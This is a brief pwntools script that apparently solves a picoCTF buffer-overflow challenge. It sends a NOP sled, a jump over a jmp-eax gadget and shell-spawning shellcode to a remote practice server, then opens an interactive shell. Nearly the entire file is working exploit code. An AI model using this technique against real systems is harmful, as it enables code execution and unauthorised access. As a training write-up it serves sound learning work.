from pwn import *

# io = process("./vuln", )

# io = gdb.debug("./vuln", gdbscript='''
# b *0x08049db4
# c
# ''')

io = remote('saturn.picoctf.net', 55838)

elf = context.binary = ELF('./vuln')

context.log_level = 'debug'

offset = 28
shellcode = asm(shellcraft.sh())

info(len(shellcode)) 
payload = b'\x90'*(offset-2)  # nop sled
payload += b'\xeb\x04' 			# jmp short instruction. This is to skip our jmp eax call
payload += p32(0x0805333b)    # jmp eax call
payload += shellcode			# shellcode

io.sendlineafter(b'grasshopper!\n',payload)
io.interactive()

